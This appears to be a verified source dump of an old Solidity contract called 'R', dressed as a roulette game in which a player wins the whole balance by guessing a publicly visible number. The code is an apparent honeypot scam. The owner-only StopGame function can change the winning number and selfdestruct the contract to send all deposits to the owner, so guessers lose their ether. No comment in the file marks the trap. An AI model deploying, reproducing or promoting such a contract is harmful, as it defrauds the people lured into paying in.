/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract R at 0x197803b104641fbf6e206a425d9dc35dadc4f62f
*/
pragma solidity ^0.4.20;

contract R
{

    uint8 public result = 0;

    bool finished = false;

    address rouletteOwner;

    function Play(uint8 _number)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(result == _number && msg.value>0.1 ether && !finished)
        {
            msg.sender.transfer(this.balance);
            GiftHasBeenSent();
        }
    }

    function StartRoulette(uint8 _number)
    public
    payable
    {
        if(result==0)
        {
            result = _number;
            rouletteOwner = msg.sender;
        }
    }

    function StopGame(uint8 _number)
    public
    payable
    {
        require(msg.sender == rouletteOwner);
        GiftHasBeenSent();
        result = _number;
        if (msg.value>0.08 ether){
            selfdestruct(rouletteOwner);
        }
    }

    function GiftHasBeenSent()
    private
    {
        finished = true;
    }

    function() public payable{}
}